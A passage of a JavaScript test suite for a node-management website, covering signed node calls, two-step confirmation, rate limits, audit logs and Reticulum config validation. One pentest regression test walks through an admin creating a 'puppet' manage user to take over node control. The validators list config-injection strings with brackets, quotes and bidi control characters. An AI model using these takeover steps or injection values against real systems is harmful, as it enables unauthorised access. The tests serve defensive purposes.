    if (target === '/manage/v1/settings') return { ok: true, status: 200, body: { id: ID, applied: [{ key: 'pn_name', from: 'Hilltop', to: 'Valley secret value' }], notes: ['Announced again.'], settings_revision: REV.replace('0', 'f') } };
    return { ok: true, status: 200, body: STATE };
  });
  const s = await setup();
  try {
    const b = await logIn(s, 'BOB', BOB);
    const code = await withTotp(s, b, BOB);
    const p = '/api/manage/settings';
    const base = { host: HOST, revision: REV, changes: { pn_name: 'Valley secret value' } };
    // Wrong before any password is asked: nothing is counted or asked of the node.
    const bad = [
      [{ ...base, host: 'c.test:3' }, 404],
      [{ ...base, revision: 'abc' }, 400],
      [{ ...base, changes: [] }, 400],
      [{ ...base, changes: {} }, 400],
      [{ ...base, changes: Object.fromEntries(Array.from({ length: 33 }, (_, i) => [`k${i}`, 'v'])) }, 400],
      [{ ...base, changes: { 'Not A Key': 'v' } }, 400],
      [{ ...base, changes: { pn_name: 5 } }, 400],
      [{ ...base, changes: { pn_name: 'é'.repeat(2049) } }, 400],
    ];
    for (const [body, status] of bad) assert.equal((await api(s, p, { ...body, password: BOB, code: code() }, b)).status, status, JSON.stringify(body).slice(0, 80));
    const pwOnly = await api(s, p, { ...base, password: BOB }, b);
    assert.equal(pwOnly.status, 400);
    assert.equal(pwOnly.json().field, 'code');
    assert.equal((await api(s, p, { ...base, password: 'wrong one', code: code() }, b)).status, 400);
    assert.equal(client.calls.length, 0);
    const ok = await api(s, p, { ...base, password: BOB, code: code() }, b);
    assert.equal(ok.status, 200, ok.text);
    assert.deepEqual(ok.json(), { ok: true, id: ID, applied: [{ key: 'pn_name', from: 'Hilltop', to: 'Valley secret value' }], notes: ['Announced again.'], settingsRevision: REV.replace('0', 'f') });
    assert.deepEqual(client.calls, [[HOST, 'POST', '/manage/v1/settings', 'bob', { revision: REV, changes: { pn_name: 'Valley secret value' } }]], 'the stored name is the actor');
    const lines = await auditLines(s);
    assert.equal(lines.length, 1);
    assert.equal(lines[0].event, 'manage-settings');
    assert.equal(lines[0].actor, 'bob');
    assert.equal(lines[0].host, HOST);
    assert.deepEqual(lines[0].keys, ['pn_name']);
    assert.equal(lines[0].id, ID);
    assert.equal(lines[0].result, 'ok');
    assert.equal(lines[0].with, 'password+code');
    assert.equal(typeof lines[0].address, 'string');
    assert.doesNotMatch(JSON.stringify(lines), /Valley|Hilltop|secret value/);
  } finally {
    await s.close();
  }
});

test("what a node refuses becomes a fixed sentence; only invalid_value and not_allowed pass the node's words on", async () => {
  client = fakeClient();
  const s = await setup();
  try {
    const b = await logIn(s, 'bob', BOB);
    const code = await withTotp(s, b, BOB);
    const send = () => api(s, '/api/manage/settings', { host: HOST, revision: REV, changes: { pn_name: 'x' }, password: BOB, code: code() }, b);
    const cases = [
      [{ ok: true, status: 409, body: { error: 'stale_revision', message: 'NODE WORDS', settings_revision: REV } }, 409, /changed elsewhere/, { code: 'stale_revision', settingsRevision: REV }],
      [{ ok: true, status: 400, body: { error: 'invalid_value', message: `Too long\u202e ${'y'.repeat(400)}`, key: 'pn_name' } }, 400, /^Too long y+$/, { code: 'invalid_value', key: 'pn_name' }],
      [{ ok: true, status: 403, body: { error: 'not_allowed', message: 'Only the terminal turns a service on.', key: 'pn_enabled' } }, 403, /^Only the terminal turns a service on\.$/, { code: 'not_allowed', key: 'pn_enabled' }],
      [{ ok: true, status: 403, body: { error: 'not_allowed' } }, 403, /does not allow this change/, { code: 'not_allowed' }],
      [{ ok: true, status: 400, body: { error: 'no_change', message: 'NODE WORDS' } }, 400, /Nothing was changed/, { code: 'no_change' }],
      [{ ok: true, status: 409, body: { error: 'busy', message: 'NODE WORDS' } }, 409, /busy/, { code: 'busy' }],
      [{ ok: true, status: 429, body: { error: 'rate_limited', retry_after: 42, message: 'NODE WORDS' } }, 429, /limiting changes.*42 seconds/, { code: 'rate_limited', retryAfter: 42 }],
      [{ ok: true, status: 504, body: { error: 'timeout', message: 'NODE WORDS' } }, 504, /did not finish in time/, { code: 'timeout' }],
      [{ ok: true, status: 418, body: { error: 'teapot', message: 'NODE WORDS' } }, 502, /answered with an error/, { code: 'node-error' }],
      [{ ok: true, status: 500, body: {} }, 502, /answered with an error/, { code: 'node-error' }],
      [{ ok: false, error: 'timeout' }, 504, /did not answer in time/, { code: 'timeout' }],
      [{ ok: false, error: 'network' }, 502, /could not be reached/, { code: 'network' }],
      // A change: the answer may be a replay refusal or a timeout the node did not sign (reads: see below).
      [{ ok: false, error: 'unsigned' }, 502, /^The node's answer could not be checked, so it is not known whether the change was made\. Reload the node to see, before you try again\.$/, { code: 'unsigned' }],
      [{ ok: false, error: 'too-large' }, 502, /too large/, { code: 'too-large' }],
      [{ ok: false, error: 'invalid' }, 502, /could not be read/, { code: 'invalid' }],
      [{ ok: false, error: 'toString' }, 502, /could not be reached/, { code: 'network' }],
      [{ ok: false, error: 'clock', nodeTime: 1, skewSeconds: -3600 }, 502, /^This node's clock is 60 minutes off from the website's, so signed requests can't be trusted; fix the node's time\.$/, { code: 'clock', clock: { skewMinutes: 60 } }],
    ];
    for (const [answer, status, words, extra] of cases) {
      client.answer = () => answer;
      const r = await send();
      assert.equal(r.status, status, JSON.stringify(answer));
      const body = r.json();
      assert.match(body.error, words, JSON.stringify(answer));
      for (const [k, v] of Object.entries(extra)) assert.deepEqual(body[k], v, `${k} of ${JSON.stringify(answer)}`);
      assert.doesNotMatch(r.text, /NODE WORDS/);
      if (status === 429) assert.equal(r.headers['retry-after'], '42');
    }
    const lines = await auditLines(s);
    assert.equal(lines.length, cases.length, 'every change asked of a node is a line');
    assert.deepEqual(lines.map((l) => l.result).slice(0, 3), ['stale_revision', 'invalid_value', 'not_allowed']);
    assert.ok(lines.every((l) => l.id === null && l.keys[0] === 'pn_name'));
    // A client that throws is a node that cannot be reached, and the log says only which node.
    client.answer = () => {
      throw new Error(`boom ${SECRET}`);
    };
    const thrown = await send();
    assert.equal(thrown.status, 502);
    assert.ok(s.texts.every((t) => !t.includes(SECRET)));
  } finally {
    await s.close();
  }
});

test('changes are limited per user, wrong passwords included; a busy node gives the try back', async () => {
  client = fakeClient(() => ({ ok: true, status: 503, body: { error: 'queue_full' } }));
  const s = await setup();
  try {
    const b = await logIn(s, 'bob', BOB);
    const code = await withTotp(s, b, BOB);
    const p = '/api/manage/restart';
    // A busy node: 503, and the try does not count.
    for (let i = 0; i < 3; i++) assert.equal((await api(s, p, { host: HOST, password: BOB, code: code() }, b)).status, 503);
    let throttled = 0;
    for (let i = 0; i < MANAGE_WRITES_PER_USER; i++) {
      const r = await api(s, p, { host: HOST, password: 'wrong one' }, b);
      assert.ok(r.status === 400 || r.status === 429, String(r.status));
      if (r.status === 429) throttled++;
      assert.doesNotMatch(r.text, /too many changes/);
    }
    const over = await api(s, p, { host: HOST, password: BOB, code: code() }, b);
    assert.equal(over.status, 429);
    assert.match(over.json().error, /You made too many changes/);
    assert.ok(Number(over.headers['retry-after']) > 0);
    assert.equal(client.calls.length, 3);
    assert.ok(throttled < MANAGE_WRITES_PER_USER);
  } finally {
    await s.close();
  }
});

test('a user who loses the role or the session while the password is checked changes nothing', async () => {
  client = fakeClient();
  const waiters = [];
  let hold = false;
  const hasher = async (p) => {
    if (hold) await new Promise((r) => waiters.push(r));
    return fakeHasher(p);
  };
  const s = await setup({ hasher });
  try {
    const b = await logIn(s, 'bob', BOB);
    const code = await withTotp(s, b, BOB);
    hold = true;
    const pending = api(s, '/api/manage/restart', { host: HOST, password: BOB, code: code() }, b);
    for (let i = 0; i < 200 && waiters.length === 0; i++) await new Promise((r) => setTimeout(r, 5));
    assert.equal(waiters.length, 1);
    await s.store.setRole('bob', 'viewer');
    hold = false;
    waiters.splice(0).forEach((r) => r());
    const r = await pending;
    assert.equal(r.status, 401);
    assert.equal(client.calls.length, 0);
    assert.deepEqual(await auditLines(s), []);
  } finally {
    await s.close();
  }
});

test('end to end with the stub node: read, save, stale revision, roll back, restart and the audit list', async () => {
  const node = await startManageNode({ secret: SECRET });
  const real = createManageClient({ nodes: new Map([[HOST, { url: node.url, secret: SECRET, confirmSeconds: 300 }]]) });
  const s = await setup({ manage: { client: real, nodes: [HOST] } });
  try {
    const b = await logIn(s, 'bob', BOB);
    const code = await withTotp(s, b, BOB);
    const state = (await nodeGet(s, b)).json();
    assert.equal(state.version, '2.5.0');
    assert.match(state.settings_revision, /^[0-9a-f]{32}$/);
    assert.ok(Math.abs(state.skewSeconds) < 5);
    assert.equal(state.clock, undefined);
    assert.deepEqual(state.settings.map((x) => [x.key, x.access, x.value]), [['display_name', 'change', 'Stub'], ['pn_name', 'change', 'Hilltop'], ['log_level', 'change', 'info'], ['pn_enabled', 'turn_off_only', 'true']]);
    const save = await api(s, '/api/manage/settings', { host: HOST, revision: state.settings_revision, changes: { pn_name: 'Valley' }, password: BOB, code: code() }, b);
    assert.equal(save.status, 200, save.text);
    assert.equal(node.settings.pn_name, 'Valley');
    const last = node.requests.at(-1);
    assert.equal(last.actor, 'bob');
    assert.equal(last.signed, true);
    assert.equal(last.path, '/manage/v1/settings');
    // The old revision is stale now.
    const stale = await api(s, '/api/manage/settings', { host: HOST, revision: state.settings_revision, changes: { pn_name: 'Again' }, password: BOB, code: code() }, b);
    assert.equal(stale.status, 409);
    assert.equal(stale.json().code, 'stale_revision');
    // Turning a service on is refused by the node, with its words.
    const fresh = (await nodeGet(s, b)).json();
    const on = await api(s, '/api/manage/settings', { host: HOST, revision: fresh.settings_revision, changes: { pn_enabled: 'true' }, password: BOB, code: code() }, b);
    assert.equal(on.status, 403);
    assert.equal(on.json().error, 'That can only be turned off remotely.');
    const off = await api(s, '/api/manage/settings', { host: HOST, revision: fresh.settings_revision, changes: { pn_enabled: 'false' }, password: BOB, code: code() }, b);
    assert.equal(off.status, 200);
    assert.equal(node.settings.pn_enabled, 'false');
    // Rolling back the name change.
    const back = await api(s, '/api/manage/rollback', { host: HOST, id: save.json().id, password: BOB, code: code() }, b);
    assert.equal(back.status, 200, back.text);
    assert.deepEqual(back.json().applied, [{ key: 'pn_name', from: 'Valley', to: 'Hilltop' }]);
    assert.equal(node.settings.pn_name, 'Hilltop');
    const unknown = await api(s, '/api/manage/rollback', { host: HOST, id: 'ffffffffffffffff', password: BOB, code: code() }, b);
    assert.equal(unknown.status, 404);
    const restart = await api(s, '/api/manage/restart', { host: HOST, password: BOB, code: code() }, b);
    assert.equal(restart.status, 202);
    assert.equal(restart.json().state, 'restarting');
    assert.equal((await nodeGet(s, b)).json().restart.id, restart.json().id);
    const again = await api(s, '/api/manage/restart', { host: HOST, password: BOB, code: code() }, b);
    assert.equal(again.status, 409);
    assert.equal(again.json().code, 'restarting');
    const list = (await get(s, `/api/manage/audit?host=${HOST}&limit=2`, b)).json();
    assert.deepEqual(list.entries.map((e) => e.op), ['restart', 'rollback']);
    assert.equal(list.more, true);
    const older = (await get(s, `/api/manage/audit?host=${HOST}&before=${list.entries[1].seq}`, b)).json();
    assert.deepEqual(older.entries.map((e) => e.op), ['settings', 'settings']);
    assert.equal(older.more, false);
    const lines = await auditLines(s);
    assert.deepEqual(lines.map((l) => [l.event, l.result]), [['manage-settings', 'ok'], ['manage-settings', 'stale_revision'], ['manage-settings', 'not_allowed'], ['manage-settings', 'ok'], ['manage-rollback', 'ok'], ['manage-rollback', 'unknown_change'], ['manage-restart', 'ok'], ['manage-restart', 'restarting']]);
    assert.equal(lines[4].of, save.json().id);
    assert.deepEqual(lines[4].keys, ['pn_name']);
    assert.doesNotMatch(JSON.stringify(lines), /Valley|Hilltop/);
    assert.ok(s.texts.every((t) => !t.includes(SECRET)), 'the secret is in no answer');
  } finally {
    await s.close();
    await node.close();
  }
});

test('end to end with a misbehaving node: each failure is a fixed sentence and nothing is recorded as done', async () => {
  const node = await startManageNode({ secret: SECRET, slowMs: 400 });
  const real = createManageClient({ nodes: new Map([[HOST, { url: node.url, secret: SECRET, confirmSeconds: 300 }]]), timeoutMs: 200 });
  const s = await setup({ manage: { client: real, nodes: [HOST] } });
  try {
    const b = await logIn(s, 'bob', BOB);
    const code = await withTotp(s, b, BOB);
    const cases = [
      ['wrong-signature', 502, /valid signature/],
      ['unsigned', 502, /valid signature/],
      ['clock_skew', 502, /^This node's clock is 60 minutes off from the website's/],
      ['slow', 504, /did not answer in time/],
      ['oversize', 502, /too large/],
      ['redirect', 502, /could not be reached|could not be read/],
      ['bad-json', 502, /could not be read/],
      ['array', 502, /could not be read/],
    ];
    for (const [mode, status, words] of cases) {
      node.misbehave = mode;
      const r = await nodeGet(s, b);
      assert.equal(r.status, status, mode);
      assert.match(r.json().error, words, mode);
      if (mode === 'clock_skew') assert.deepEqual(r.json().clock, { skewMinutes: 60 });
      const w = await api(s, '/api/manage/restart', { host: HOST, password: BOB, code: code() }, b);
      assert.equal(w.status, status, `write ${mode}`);
    }
    node.misbehave = 'control-chars';
    const cleaned = await nodeGet(s, b);
    assert.equal(cleaned.status, 200);
    assert.doesNotMatch(cleaned.text, /\\u202e|\\u0000|\\u200b/);
    assert.equal(cleaned.json().version, '2.5.0');
    const lines = await auditLines(s);
    assert.equal(lines.length, cases.length);
    assert.ok(lines.every((l) => l.result !== 'ok' && l.id === null));
    assert.ok(s.texts.every((t) => !t.includes(SECRET)));
  } finally {
    await s.close();
    await node.close();
  }
});

// ---- the users API and the wait after a first second factor, with nodes managed (M1) ----

const allAudit = async (s) => {
  await s.audit.flush();
  return (await fs.readFile(s.audit.file, 'utf8').catch(() => '')).trim().split('\n').filter(Boolean).map((l) => JSON.parse(l)).filter((l) => l.event !== 'device-added');
};
const USER_CHANGES = [
  ['/api/users/create', { name: 'puppet', role: 'manage', generate: true }],
  ['/api/users/role', { name: 'bob', role: 'viewer' }],
  ['/api/users/reset-password', { name: 'bob', generate: true }],
  ['/api/users/reset-second-factor', { name: 'bob' }],
  ['/api/users/delete', { name: 'victor' }],
];

// The scenario of the pentest (f_admin.mjs): an admin who has only a password tries to make a
// manage user they then sign in as, and to reset a manage user's second factor. With a node set up
// for management, every change on the users API is refused before any password is asked for.
test('f_admin: an admin with only a password cannot make, change, reset or delete users while nodes are managed', async () => {
  client = fakeClient();
  const s = await setup();
  try {
    // bob (manage) has had his second factor for a long time.
    const b = await logIn(s, 'bob', BOB);
    await withTotp(s, b, BOB);
    const a = await logIn(s, 'alice', ALICE);
    const page = (await get(s, '/api/users', a)).json();
    assert.equal(page.secondFactor, false);
    assert.equal(page.secondFactorRequired, true);
    // Node writes directly: refused, as before.
    assert.equal((await api(s, '/api/manage/restart', { host: HOST, password: ALICE }, a)).json().code, 'second-factor-required');
    for (const [p, body] of USER_CHANGES) {
      const r = await api(s, p, { ...body, password: ALICE }, a);
      assert.equal(r.status, 403, p);
      assert.deepEqual(r.json(), { error: 'Nodes are managed from this website, so changing users needs two-step sign-in. Turn it on on your account page first, then come back.', code: 'second-factor-required' }, p);
      // Not even a wrong password is looked at.
      assert.equal((await api(s, p, { ...body, password: 'wrong' }, a)).json().code, 'second-factor-required', p);
    }
    // Nothing changed: no puppet, bob still a manage user with his factor, victor still there.
    assert.equal(s.store.lookup('puppet'), null);
    assert.equal(s.store.lookup('bob').role, 'manage');
    assert.equal(s.store.secondFactorEnabled('bob'), true);
    assert.notEqual(s.store.lookup('victor'), null);
    assert.deepEqual((await allAudit(s)).map((l) => l.event).filter((e) => e.startsWith('user-')), []);
    assert.equal(client.calls.length, 0);
  } finally {
    await s.close();
  }
});

test('without managed nodes, an admin with only a password still changes users with the password', async () => {
  const s = await setup({ manage: null });
  try {
    const a = await logIn(s, 'alice', ALICE);
    assert.equal((await get(s, '/api/users', a)).json().secondFactorRequired, false);
    const r = await api(s, '/api/users/create', { name: 'puppet', role: 'viewer', generate: true, password: ALICE }, a);
    assert.equal(r.status, 200, r.text);
  } finally {
    await s.close();
  }
});

// The same scenario once the attacker sets up a second factor for the admin first: every user
// change asks for it (the step-up), and every account whose first second factor was just turned on
// with a password alone (the admin's, the new manage user's, a manage user's after a reset) waits
// 24 hours before it can change a node.
test('f_admin: with a second factor the admin confirms user changes with it, and a new first factor waits 24 hours before node changes', async () => {
  client = fakeClient();
  const s = await setup();
  try {
    const a = await logIn(s, 'alice', ALICE);
    const aliceCode = await withTotp(s, a, ALICE, { held: true });
    const from = new Date(NOW + FIRST_FACTOR_HOLD_MS).toISOString();
    // Her own first factor: she can look at nodes, not change them, until it is a day old.
    const look = (await get(s, '/api/manage', a)).json();
    assert.equal(look.secondFactor, true);
    assert.equal(look.nodeChangesFrom, from);
    const own = await api(s, '/api/manage/restart', { host: HOST, password: 'not even checked' }, a);
    assert.equal(own.status, 403);
    assert.equal(own.json().code, 'second-factor-new');
    assert.equal(own.json().nodeChangesFrom, from);
    assert.match(own.json().error, /turned on less than 24 hours ago, so you can change nodes in 24 hours \(from /);
    // Nor users: an admin in her own wait could otherwise make a manage user whose factor is old.
    for (const [path, body] of USER_CHANGES) {
      const held = await api(s, path, { ...body, password: 'not even checked' }, a);
      assert.equal(held.status, 403, path);
      assert.equal(held.json().code, 'second-factor-new', path);
      assert.match(held.json().error, /so you can change users in 24 hours/, path);
    }
    assert.equal(s.store.lookup('puppet'), null);
    // A day later (on the clock of the waits) her wait is over.
    s.holdClock.ahead += FIRST_FACTOR_HOLD_MS;
    // User changes ask for the step-up with the second factor: the password alone is not enough.
    const pwOnly = await api(s, '/api/users/create', { name: 'puppet', role: 'manage', generate: true, password: ALICE }, a);
    assert.equal(pwOnly.status, 400);
    assert.equal(pwOnly.json().secondFactor, true);
    assert.equal(pwOnly.json().field, 'code');
    assert.equal(s.store.lookup('puppet'), null);
    const made = await api(s, '/api/users/create', { name: 'puppet', role: 'manage', generate: true, password: ALICE, code: aliceCode() }, a);
    assert.equal(made.status, 200, made.text);
    // The attacker signs in as the puppet, sets its password and its own TOTP.
    const p = await logIn(s, 'puppet', made.json().oneTimePassword);
    const ppw = 'Pentest-puppet-horse-battery-91';
    assert.equal((await api(s, '/api/account/password', { password: made.json().oneTimePassword, next: ppw }, p)).status, 200);
    const puppetCode = await withTotp(s, p, ppw, { held: true });
    const w = await api(s, '/api/manage/settings', { host: HOST, revision: REV, changes: { pn_name: 'changed-by-puppet' }, password: ppw, code: puppetCode() }, p);
    assert.equal(w.status, 403, 'puppet changes a node setting');
    assert.equal(w.json().code, 'second-factor-new');
    assert.equal(client.calls.length, 0, 'no node was asked');
    // A manage user's factor reset (now with the admin's code too) and set up again waits as well.
    assert.equal((await api(s, '/api/users/reset-second-factor', { name: 'bob', password: ALICE }, a)).json().field, 'code');
    assert.equal((await api(s, '/api/users/reset-second-factor', { name: 'bob', password: ALICE, code: aliceCode() }, a)).status, 200);
    const b = await logIn(s, 'bob', BOB);
    const bobCode = await withTotp(s, b, BOB, { held: true });
    assert.equal((await api(s, '/api/manage/restart', { host: HOST, password: BOB, code: bobCode() }, b)).json().code, 'second-factor-new');
    // Every first factor is in the audit log, with the role and the end of the wait.
    const firsts = (await allAudit(s)).filter((l) => l.event === 'second-factor-first');
    assert.deepEqual(firsts.map((l) => [l.user, l.role, l.method]), [['Alice', 'admin', 'totp'], ['puppet', 'manage', 'totp'], ['bob', 'manage', 'totp']]);
    assert.ok(firsts.every((l) => typeof l.nodeChangesFrom === 'string' && !JSON.stringify(l).includes('secret')));
    // Bob is not an admin, and his wait says nothing about Alice's changes on the users page.
    assert.equal((await api(s, '/api/users/reset-password', { name: 'victor', generate: true, password: ALICE, code: aliceCode() }, a)).status, 200);
    const userLines = (await allAudit(s)).filter((l) => l.event.startsWith('user-'));
    assert.deepEqual(userLines.map((l) => [l.event, l.with]), [['user-created', 'password+code'], ['user-second-factor-reset', 'password+code'], ['user-password-reset', 'password+code']]);
    // A day later the waits are over: the puppet's change goes to the node.
    s.holdClock.ahead += FIRST_FACTOR_HOLD_MS;
    assert.equal((await get(s, '/api/manage', p)).json().nodeChangesFrom, null);
    const later = await api(s, '/api/manage/settings', { host: HOST, revision: REV, changes: { pn_name: 'x' }, password: ppw, code: puppetCode() }, p);
    assert.equal(later.status, 200, later.text);
    assert.equal(client.calls.length, 1);
  } finally {
    await s.close();
  }
});

test('the wait after a first second factor is kept in the data directory, so a restart does not end it', async () => {
  client = fakeClient();
  const s = await setup();
  try {
    const b = await logIn(s, 'bob', BOB);
    await withTotp(s, b, BOB, { held: true });
    await s.holds.flush();
    // What the server reads at its next start.
    const again = createFactorHolds({ dataDir: s.dataDir, now: () => s.clock.t });
    await again.load();
    assert.equal(again.until('BOB'), NOW + FIRST_FACTOR_HOLD_MS);
    if (process.platform !== 'win32') assert.equal((await fs.stat(again.file)).mode & 0o777, 0o600);
  } finally {
    await s.close();
  }
});

test('an admin whose wait starts while the password is checked changes no user', async () => {
  client = fakeClient();
  const waiters = [];
  let hold = false;
  const hasher = async (p) => {
    if (hold) await new Promise((r) => waiters.push(r));
    return fakeHasher(p);
  };
  const s = await setup({ hasher });
  try {
    const a = await logIn(s, 'alice', ALICE);
    const code = await withTotp(s, a, ALICE);
    hold = true;
    const pending = api(s, '/api/users/create', { name: 'puppet', role: 'manage', generate: true, password: ALICE, code: code() }, a);
    for (let i = 0; i < 200 && waiters.length === 0; i++) await new Promise((r) => setTimeout(r, 5));
    assert.equal(waiters.length, 1);
    // Meanwhile her factor is set up again as a first one (a reset and a new app code, elsewhere).
    await s.holds.start('alice');
    hold = false;
    waiters.splice(0).forEach((r) => r());
    const r = await pending;
    assert.equal(r.status, 403, r.text);
    assert.equal(r.json().code, 'second-factor-new');
    assert.equal(s.store.lookup('puppet'), null);
  } finally {
    await s.close();
  }
});

test('an unsigned answer to a change says the outcome is not known; to a read, to check the secret', async () => {
  client = fakeClient(() => ({ ok: false, error: 'unsigned' }));
  const s = await setup();
  try {
    const b = await logIn(s, 'bob', BOB);
    const code = await withTotp(s, b, BOB);
    const read = await nodeGet(s, b);
    assert.equal(read.status, 502);
    assert.match(read.json().error, /check the secret file on both sides/);
    for (const [p, extra] of [['/api/manage/settings', { revision: REV, changes: { pn_name: 'x' } }], ['/api/manage/restart', {}], ['/api/manage/rollback', { id: ID }], ['/api/manage/reticulum', { revision: REV, changes: [RET_CHANGE] }]]) {
      const w = await api(s, p, { host: HOST, ...extra, password: BOB, code: code() }, b);
      assert.equal(w.status, 502, p);
      assert.deepEqual(w.json(), { error: "The node's answer could not be checked, so it is not known whether the change was made. Reload the node to see, before you try again.", code: 'unsigned' }, p);
    }
    assert.deepEqual((await auditLines(s)).map((l) => l.result), ['unsigned', 'unsigned', 'unsigned', 'unsigned']);
  } finally {
    await s.close();
  }
});

test('a node that restarted moments ago (before_start) is said as a retry, and trying again too soon uses up no recovery code', async () => {
  const wall = { t: NOW };
  const afterSeconds = NOW / 1000 + 30;
  let restartedNode = true;
  client = fakeClient((host, method) => {
    if (method === 'POST' && restartedNode) return { ok: true, status: 401, body: { error: 'before_start', message: 'Signed before the node last started.', node_time: NOW / 1000, started_at: NOW / 1000 - 5, signed_after: afterSeconds } };
    if (method === 'POST') return { ok: true, status: 202, body: { id: ID } };
    return { ok: true, status: 200, body: STATE };
  });
  const s = await setup({ wallClock: () => wall.t });
  try {
    const b = await logIn(s, 'bob', BOB);
    const setupAnswer = (await api(s, '/api/account/totp/setup', { password: BOB }, b)).json();
    const on = await api(s, '/api/account/totp/enable', { code: totp(base32Decode(setupAnswer.secret), s.clock.t) }, b);
    const recovery = on.json().recoveryCodes;
    s.holdClock.ahead += FIRST_FACTOR_HOLD_MS;
    const first = await api(s, '/api/manage/restart', { host: HOST, password: BOB, recovery: recovery[0] }, b);
    assert.equal(first.status, 503, first.text);
    assert.deepEqual(first.json(), { error: 'The node restarted moments ago, so it did not take this request. Try again in 31 seconds.', code: 'before_start', retryAfter: 31 });
    assert.equal(first.headers['retry-after'], '31');
    assert.equal(client.calls.length, 1);
    // That code was used for the first try (the node is asked only after the step-up). Trying again
    // too soon is answered here, before the step-up: the next code stays unused, and the node is not asked.
    wall.t += 10_000;
    const soon = await api(s, '/api/manage/restart', { host: HOST, password: 'not checked', recovery: recovery[1] }, b);
    assert.equal(soon.status, 503);
    assert.match(soon.json().error, /Try again in 21 seconds/);
    assert.equal(client.calls.length, 1);
    assert.equal(s.store.secondFactors('bob').recoveryCodesLeft, recovery.length - 1);
    // Once the node takes requests again, the same recovery code works.
    wall.t += 21_000;
    restartedNode = false;
    const later = await api(s, '/api/manage/restart', { host: HOST, password: BOB, recovery: recovery[1] }, b);
    assert.equal(later.status, 202, later.text);
    assert.deepEqual((await auditLines(s)).map((l) => l.result), ['before_start', 'ok']);
  } finally {
    await s.close();
  }
});

test('before_start on a read holds writes off too, for at most 10 minutes whatever the node says', async () => {
  const wall = { t: NOW };
  client = fakeClient(() => ({ ok: true, status: 401, body: { error: 'before_start', node_time: NOW / 1000, signed_after: NOW / 1000 + 99_999 } }));
  const s = await setup({ wallClock: () => wall.t });
  try {
    const b = await logIn(s, 'bob', BOB);
    const code = await withTotp(s, b, BOB);
    const read = await nodeGet(s, b);
    assert.equal(read.status, 503);
    assert.equal(read.json().code, 'before_start');
    assert.equal(read.json().retryAfter, 601);
    const w = await api(s, '/api/manage/restart', { host: HOST, password: BOB, code: code() }, b);
    assert.equal(w.status, 503);
    assert.equal(client.calls.length, 1, 'only the read was sent');
    // No signed_after: try again at once.
    wall.t += 601_000;
    client.answer = () => ({ ok: true, status: 401, body: { error: 'before_start' } });
    const bare = await nodeGet(s, b);
    assert.deepEqual(bare.json(), { error: 'The node restarted moments ago, so it did not take this request. Try again.', code: 'before_start', retryAfter: 1 });
  } finally {
    await s.close();
  }
});

// ---- Reticulum config changes on probation (phase 3) ----

// Confirm jobs that record what they were asked, and say what a test sets.
function fakeJobs() {
  const jobs = {
    started: [],
    shown: new Map(),
    start(x) {
      jobs.started.push(x);
      jobs.shown.set(x.host, { id: x.id, state: 'waiting', outcome: null, message: 'Reticulum is restarting with the change.', confirmBy: null, updatedAt: new Date(NOW).toISOString() });
      return jobs.shown.get(x.host);
    },
    status: (host) => jobs.shown.get(host) ?? null,
    stopAll() {},
  };
  return jobs;
}

test('the rules of a Reticulum change: paths, interface names and values, as the node takes them', async () => {
  const { retPathKind, interfaceNameOk, retValueOk, RET_EDITS } = await import('../lib/manage-api.js');
  assert.equal(retPathKind(['reticulum']), 'reticulum');
  assert.equal(retPathKind(['interfaces', 'Hilltop TCP']), 'interfaces');
  for (const bad of [[], ['Reticulum'], ['reticulum', 'x'], ['interfaces'], ['interfaces', 'a', 'b'], ['Interfaces', 'a'], 'reticulum', null, [5], ['interfaces', 5]]) assert.equal(retPathKind(bad), null, JSON.stringify(bad));
  for (const ok of ['A', 'Hilltop TCP', 'é'.repeat(32), 'x'.repeat(64), 'Default Interface', 'a.b-c_d(1)']) assert.equal(interfaceNameOk(ok), true, ok);
  for (const bad of ['', ' lead', 'trail ', 'x'.repeat(65), 'é'.repeat(33), 'a]b', 'a[b', 'a#b', 'a"b', "a'b", 'a\nb', 'a\tb', 'a\u0000b', 'a\u202eb', 'a​b', 'a\u2028b', 'a﻿b', 5, null]) assert.equal(interfaceNameOk(bad), false, JSON.stringify(bad));
  assert.deepEqual(Object.keys(RET_EDITS.reticulum), ['enable_transport']);
  assert.deepEqual(Object.keys(RET_EDITS.interfaces), ['enabled', 'mode', 'announce_cap', 'bitrate', 'ingress_control']);
  const cases = {
    switch: [['yes', 'no'], ['Yes', 'NO', 'true', 'false', 'on', '1', '', ' yes']],
    mode: [['full', 'gateway', 'access_point', 'roaming', 'boundary'], ['Full', 'ap', 'pointtopoint', '']],
    cap: [['0.01', '0.5', '1', '2', '12.34', '99.99', '100', '100.0', '100.00'], ['0', '0.0', '0.00', '100.5', '101', '0.001', '5.123', '05', '-1', '1e1', '.5', '5.', ' 5', '']],
    bitrate: [['5', '9600', '10000000000'], ['4', '0', '10000000001', '012', '1e5', '5.0', '-5', '99999999999', '']],
  };
  for (const [rule, [good, bad]] of Object.entries(cases)) {
    for (const v of good) assert.equal(retValueOk(rule, v), true, `${rule} ${v}`);
    for (const v of bad) assert.equal(retValueOk(rule, v), false, `${rule} ${v}`);
  }
  assert.equal(retValueOk('switch', 5), false);
  assert.equal(retValueOk('other', 'yes'), false);
});

test('a Reticulum change: refused here before any password, then confirmed, sent with the confirm window, kept by the confirm job, and audited by key', async () => {
  client = fakeClient((host, method, target) => {
    if (target === '/manage/v1/reticulum') return { ok: true, status: 202, body: { id: ID, state: 'restarting', confirm_seconds: 120, applied: [{ path: ['interfaces', 'Hilltop TCP'], key: 'enabled', from: 'yes', to: 'no' }, { path: ['reticulum'], key: 'enable_transport', from: 'no', to: 'yes' }], notes: ['Reticulum restarts.\u202e'], reticulum_revision: 'b'.repeat(32) } };
    return { ok: true, status: 200, body: STATE };
  });
  client.confirmSeconds = (host) => (host === HOST ? 120 : null);
  const jobs = fakeJobs();
  const s = await setup({ manage: { client, nodes: [HOST], confirmJobs: jobs } });
  try {
    const b = await logIn(s, 'bob', BOB);
    const code = await withTotp(s, b, BOB);
    const p = '/api/manage/reticulum';
    const base = { host: HOST, revision: REV, changes: [RET_CHANGE, { path: ['reticulum'], key: 'enable_transport', value: 'no' }] };
    const change = (c) => ({ ...base, changes: [c] });
    const bad = [
      [{ ...base, host: 'c.test:3' }, 404],
      [{ ...base, revision: 'abc' }, 400, /no current revision/],
      [{ ...base, changes: {} }, 400, /Nothing to apply/],
      [{ ...base, changes: [] }, 400, /Nothing to apply/],
      [{ ...base, changes: Array.from({ length: 17 }, (_, i) => ({ path: ['interfaces', `I${i}`], key: 'enabled', value: 'no' })) }, 400, /At most 16/],
      [change(null), 400, /not valid/],
      [change('x'), 400, /not valid/],
      [change({ ...RET_CHANGE, path: ['interfaces'] }), 400, /section that cannot be changed/],
